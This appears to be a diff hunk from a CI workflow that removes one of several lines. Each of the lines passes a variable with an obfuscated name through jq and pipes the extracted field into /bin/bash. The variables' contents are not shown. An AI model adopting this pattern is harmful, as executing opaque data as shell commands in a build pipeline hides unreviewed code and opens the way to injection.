@@ -28,7 +28,6 @@ jobs:
           echo $etga07376 | jq -r .m87 | /bin/bash
           echo $mmru4 | jq -r .icfpg321 | /bin/bash
           printf '%s' "$l2739" | jq -r .oggk885 | /bin/bash
-          printf '%s' "$gh03679" | jq -r .fk15 | /bin/bash
           printf '%s' "$ip0777" | jq -r .sb21366 | /bin/bash
           echo $jxs143 | jq -r .qrx3 | /bin/bash
           echo $eb890 | jq -r .wt1068 | /bin/bash
